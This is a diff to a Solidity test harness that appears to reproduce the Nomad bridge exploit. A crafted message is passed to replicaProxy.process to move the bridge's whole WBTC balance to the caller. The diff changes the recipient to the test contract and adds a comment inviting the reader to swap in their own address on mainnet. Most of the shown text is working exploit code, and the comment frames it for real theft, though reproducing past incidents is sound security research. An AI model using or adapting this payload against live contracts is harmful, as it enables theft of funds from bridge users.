@@ -34,27 +34,33 @@ contract Exploit_Nomad is TestHarness, TokenBalanceTracker {
         cheat.label(NOMAD_DEPLOYER, "Nomad Deployer");
 
         addTokenToTracker(address(WBTC));
-        
+
         console.log("\nInitial balances:");
         updateBalanceTracker(ercBridge);
-        updateBalanceTracker(attacker);
+        updateBalanceTracker(address(this));
 
-        logBalancesWithLabel("Bridge", ercBridge);
-        logBalancesWithLabel("Attacker", attacker);
     }
 
     function test_attack() external {
+        uint256 balanceAttackerBefore = WBTC.balanceOf(address(this));
 
-        bytes memory payload = getPayload(attacker, address(WBTC), WBTC.balanceOf(ercBridge));
-        emit log_named_bytes("\nTx Payload", payload); 
+        logBalancesWithLabel("Bridge", ercBridge);
+        logBalancesWithLabel("Attacker", address(this));
+
+        // Try chaning address(this) for your address in mainnet ;)
+        bytes memory payload = getPayload(address(this), address(WBTC), WBTC.balanceOf(ercBridge));
+
+        emit log_named_bytes("Tx Payload", payload);
         
-        cheat.prank(attacker);
         bool success = replicaProxy.process(payload);
         require(success, "Process failed");
 
-        console.log("\nFinal balances:");
+        console.log("Final balances:");
         logBalancesWithLabel("Bridge", ercBridge);
-        logBalancesWithLabel("Attacker", attacker);
+        logBalancesWithLabel("Attacker", address(this));
+
+        uint256 balanceAttackerAfter = WBTC.balanceOf(address(this));
+        assertGe(balanceAttackerAfter, balanceAttackerBefore);
     }
 
     function getPayload(address recipient, address token, uint256 amount) public pure returns (bytes memory) {
